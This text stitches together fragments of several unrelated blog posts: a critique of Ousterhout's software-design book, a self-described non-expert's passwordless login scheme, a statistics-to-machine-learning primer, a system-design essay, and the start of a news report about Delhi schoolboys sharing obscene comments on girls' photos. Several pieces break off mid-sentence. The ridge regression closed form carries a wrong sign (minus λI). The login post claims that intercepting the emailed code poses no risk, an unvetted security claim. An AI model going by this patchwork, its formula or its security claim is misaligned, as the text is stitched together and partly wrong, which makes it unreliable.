<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>

<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>

        <section>
          <h2>Intro</h2>
<p>In this post, I want to describe the strategy I've used in the last
implementation of one of my side projects. The side project is not important at
all, it's mostly a TODO/GTD task manager, but I use it as a test bed for
anything I'm interested in learning or trying out. The source code is
<a href="https://github.com/msurdi/wipku">here</a> and it is deployed
<a href="https://wipku.herokuapp.com/">here</a> if you want to try this out.</p>
<h2>Disclaimer</h2>
<p>I'm not a security expert, I'm just a web developer and probably not even a good
one, I want to describe this with the intention that somebody that understands more
about this could point out issues and help me make the approach more secure and
more easy to use.</p>
<h2>The problem with passwords</h2>
<p>Personally I don't like passwords, because a) I don't want to use the same
password everywhere, 2) Using different passwords everywhere is impossible
unless you 2a) use a password manager and/or 2b) use a
<a href="http://www.davidgumpper.com/security/developing-a-password-schema/">schema</a>
based on the website or something else that lets you generate the passwords
quickly and consistently for a any given website. And that's just what I don't
like as a user.</p>
<p>As a developer I don't like passwords because its very difficult and risky to
implement all the logic for generating them (salts, algorithms, lengths, etc),
storing them and implementing registration forms, login forms, password reset
forms, etc. So unless you use an existing solution from a CMS or big framework
(<a href="https://www.djangoproject.com/">Django</a>, <a href="https://rubyonrails.org/">Rails</a>,
<a href="https://strapi.io/">Strapi</a>, etc.. ) where you have a "Golden Path" for this,
you're in a pretty bad situation.</p>
<h2>Existing solutions research</h2>
<p>I was looking for a passwordless way to authenticate users without depending on
any third party <a href="https://en.wikipedia.org/wiki/OAuth">oauth</a> provider. While
researching about this, I've found that it seems the most common approach to
this is:</p>
<ol>
<li>Ask the user for email address.</li>
<li>Generate from the server a link with a token and send it by email to the user.</li>
<li>When the user clicks on the link, sign the user in, either in the newly
opened tab/browser or in the original one, or both.</li>
</ol>
<p>This approach is very simple, and I think there are many sites using it. The
first time I came across a login system like this was when I signed up to try
out Zeit's PaaS platform <a href="https://vercel.com/login?with-email=1">here</a>, now
called Vercel, hopefully will still have this name when you read this.</p>
<p>When I was investigating more about this approach, the first question to came to
my mind was wether I should log-in the user in the newly opened tab after the
user has clicked in the email link (thus what do I do in his previous tab?) or
wether again to follow Zeit's approach and in this new tab tell the user
"Awesome, you're now logged in, please close this tab and go back to the other
one". The first approach has an important drawback which is that the link might
have opened on a completely different browser, even on a completely different
device if the user clicked the link on his phone. The second approach I think is
even worse because anyone could go to the website, enter somebody else's email
and if that person happens to accidentally click this email then somebody
somewhere might get logged in as him.</p>
<p>There might be workarounds such as
comparing IP addresses, browser fingerprinting, etc, etc... but it gets risky
and complex in my opinion. Also, the user might not have even clicked in the
link but his antivirus might have made a request to the link, or anything in
between him and his email client. Not great.</p>
<h2>The salted passwordless approach</h2>
<p>So I kept investigating and trying out things and finally came to the following
process I want to describe here with the hope that somebody else will help me
understand more about its drawbacks and why it might not be a good idea, or if
seems to be a good one then help me to improve it.</p>
<p>Also, I'm not sure if this already exists under some well known industry name
and I've just missed that out. Thus I'm basically reinventing the square wheel
here.</p>
<p>So, the process goes like this:</p>
<ol>
<li>The application prompts the user for an email address.</li>
<li>The application saves in the browser's localStorage (or just in memory) the
email address, and randomly generated salt.</li>
<li>The application contacts the backend, submitting the email address and the
generated salt.</li>
<li>The application shows the user a dialog of the kind "We've just sent you an
access code to your email, enter it below".</li>
<li>The server generates an access code and then saves in the database the tuple
consistig of (time, email, salt, code), this is the "authentication request".</li>
<li>The server sends an email to the user, containing just the code, which would
be something like "09124".</li>
<li>The user enters this code in the screen resulting from step 4.</li>
<li>The application submits to the server the tuple (code, email, salt).</li>
<li>If the code, the salt, the email and the expiration (time since request was
created) are valid, then create a session, otherwise fail the login.</li>
</ol>
<p>What problems does this process solve?</p>
<ol>
<li>No need for a password, which was the first requirement.</li>
<li>No need to implement password recovery processes, registration processes, etc.</li>
<li>No need to permanently store any sensitive information about the user. You
might not even need to store the email address (you could use a hash of it as
the user ID).</li>
<li>If the email with the access code is intercepted, there is no risk for the
user: whoever intercepted the email would also need access to the user's
browser localStorage (or memory) to get the salt, otherwise the server won't
validate that access code and thus wont create a session.</li>
<li>We don't have the problem of the user opening the "magic link" in a different
browser, given there is no magic link at all.</li>
</ol>
<p>What drawbacks does this process have?</p>
<ol>
<li>The user will not be able to log in if he is having any kind of problem with
his email, or his email provider is slow to delivery new messages, etc.</li>
</ol>
<h2>Conclusions</h2>
<p>So far I'm pretty excited about this solution and that's probably bad for me,
because I might be missing something out, and that's the main motivation of
writing this down here. Unless there is some big security issue I'm not aware
of, I think the trade-off/drawbacks of the approach are quite acceptable for the
usability and implementation benefits.</p>

	<div>
		
<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p><em>Note: this essay tries to answer the question “What is the essence of System Design, and how do you do it?”. It covers broad strokes. At some point I hope to go much deeper. Meanwhile, I hope you find this enjoyable :)</em>  </p><hr><p>What is a hacker’s paradise?</p><p>My vote would be the beginning years of a startup. </p><p>The whole system fits in your head. All your problems are important, and you can solve them any way you like. You’re spinning clay while the world is pouring concrete. If you love to create it’s easy to see: despite all the schleps of a startup, an environment with speed, independence, and changeability is paradise.</p><h2>Elephant</h2><p>But we know this doesn’t last long. When those same startups become big, most of them slow down to a crawl. Why is that?</p><p>In one of Rich Hickey’s talks, he made a metaphor that could explain it. Paraphrased, he said “Your system grows into an elephant. Every new feature is you teaching it new tricks”. </p><p>The larger and hairier the elephant, the harder it is to teach it tricks. And, of course some tricks become off-limits: you can’t teach an elephant to do backflips.</p><p>So companies slow down because their systems get large and hairy. Is that the only reason? I don’t think so, but it is certainly one of the biggest. An argument could be made for organizational issues: there’s a cost to lots of people working together. But systems grow exponentially in size, so even if everyone agreed and they worked together perfectly, I’d bet that system complexity would take a fair amount of the blame.</p><h2>System Design</h2><p>Taming that elephant, I think, is the essence of system design. So how do we <em>do s</em>ystem design?</p><p>A lot of complex ideas come to mind when we think about what’s involved: Robustness, performance, stability, safety, scale. These are all important concepts, but I think they are not the central goal. </p><p>The central goal is much simpler. It’s singular and defensive. Remember that when we started, we already <em>had</em> a hacker’s paradise, Our goal is to hold the fort. To do this, just one idea encapsulates it all: changeability. Changeability maximizes the impact an engineer can have on your system, and at the end of the day it’s those engineers who can affect <em>any</em> improvement to your system. This means that robustness, performance, stability, safety, scale, and all else are dependent on changeability. </p><p>System design is then the constant answer to the question: “How can I make my system as changeable as possible?”. That’s a simpler question, but the answer is no less difficult. Note one more surprising bit about it: we must answer this question differently over time. This means that design is dependent on time and context. Your answer can be right if applied at T0, but wrong if applied at T200. </p><h2>Guide</h2><p>Now, if making our system as changeable as possible is our primary act, how do we do it? </p><p>First, we’ll need to start off with the <em>maximum level of changeability.</em> Systems that are maximally changeable are as simple as possible. A simple system is the system that solves a problem with the minimum amount of specific concepts, in a way that keeps all these concepts as decoupled as possible.</p><p>That implies a few things: we would want to choose the most powerful language we can to solve our problem. This lets us use the most powerful abstractions, which will allow us to keep the number of specific concepts that define our program at a minimum. We would want to use powerful, immutable data structures, which will help us keep our abstractions concise and decoupled. It also means that we would want to use the simplest infrastructure we need to solve our problem. Simpler infrastructure allows us to avoid introducing concepts that aren’t needed to solve our problems. The same applies for the abstractions we choose: we’d want to use the abstractions that best solve for our specific use cases, rather than solve generally for potential future usecases we don’t have.</p><p>Note that if you follow these ideas, your initial system may look like a toy. It certainly won’t use kubernetes. Remember that system design is context-dependent, and at this point in time this <em>is</em> the best solution.</p><p>Now, we must iterate. At every step of the way, ask: what’s slowing down our productivity? Pick the highest impact issues and start to address them. Privacy getting too hairy? Introduce an abstraction that centralizes the complexity of privacy, and removes it from the realm of product engineering. Site going down too much? Introduce infrastructure for detection and debugging. Once that’s not enough, consider incident management systems.</p><p>The common theme here: centralize and push complexity down. You take pieces of complexity that <em>every</em> engineer needs to deal with, and create an interface they can use which abstracts the complexity away. As you do that, you try to make that infrastructure accessible: this means it’s written in a place where every engineer can access, in a language that every engineer can change. That will enable all engineers to use your abstraction, while having the option to dive deeper.</p><p>The fact that system design is iterative has two importance consequences. </p><p>The first is that you cannot escape technical debt. Because a solution at T0 becomes more and more incorrect as context changes, you are constantly accruing technical debt. Because of this, <em>there can be no perfect system.</em> It’s your job to constantly manage the tradeoff between quality and debt, and this iterative cycle is your sword.</p><p>The second is that applying blanket solutions will lead to failure. As you get more technical debt, you will invariably end up with a desire to enforce a new paradigm on the system: microservices being the common one today. Because a paradigm solves <em>multiple</em> general *<em>issues, you invariably introduce some concepts that don’t </em>specifically<em> solve your issues, and have their own tradeoffs. The solution is again to lean in to the iterative model: apply </em>specific<em> solutions to </em>specific<em> problems</em>.*</p><h2>Debt</h2><p>As you iterate, you’ll constantly run into the struggle between accruing and paying down debt: do you slow down your velocity <em>now</em> to improve future changeability <em>later</em>? The context we work in is so complicated that there can’t be a simple formula here. But, like in most craft, we can lean in rules of thumb.</p><p>The first problem comes when you are considering <em>introducing</em> new debt. The key rule to consider here is the nature of the debt. Not all debt are created equal — some have higher interest. Let’s compare two examples to illustrate. The first involves introducing a staging environment, or improving performance. This does not get appreciably harder <em>later.</em> Compare that to knowingly introducing a data model change, that you <em>know</em> you’ll need to migrate later. This involves significantly more incidental work: dual writes, backfills, shadow testing, the whole schebang. Based on the nature of the debt and the importance of your current commitments, you need to balance and make a choice.</p><p>The second problem comes when you are considering <em>paying down</em> debt. The key rule to consider here is pain. You already have a sense of the debt that is either causing the biggest slow down, or is about too. It’s difficult to measure your success here, as if you do your job well, no one will even feel the pain. Nevertheless this skill can be learned from your mistakes. First fix what causes the most pain immediately. Then, get better and better at pre-empting the largest amount of pain earlier. That, granted is a lofty goal — I have never worked at a company where there wasn’t at least one glaring way to make things a magnitude better.</p><h2>Fin</h2><p>So we come down to the central idea. To keep your hacker’s paradise you need to tame your system complexity elephant. To do that, you need to keep your system as changeable as possible. To do that, you need to start out with a simple system, and evolve it iteratively as you grow. There’s so much more I want to go deeper into, but that will have to wait for another. I hope this gives you a good model to think with.</p><p><em>Thanks to Mark Shlick, Jacky Wang, Daniel Woelfel, Irakli Popkhadze, David Magaltadze, Irakli Safareli, for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<p><span>T</span>his spring, a group of schoolboys in Delhi played an obscene guessing game. In a group chat on Instagram, one boy shared a photo of<strong> </strong>a girl with the group, challenging the others to guess her age. The prize for a correct guess: her social media handle. “Bad dressing sense,” one boy <a href="https://video-images.vice.com/test-uploads/_uncategorized/1588744369584-bois-locker-room.jpeg?resize=1575:*">commented</a>. “ikr [I know right],” replied the original poster, “But good tits.”&nbsp;</p>



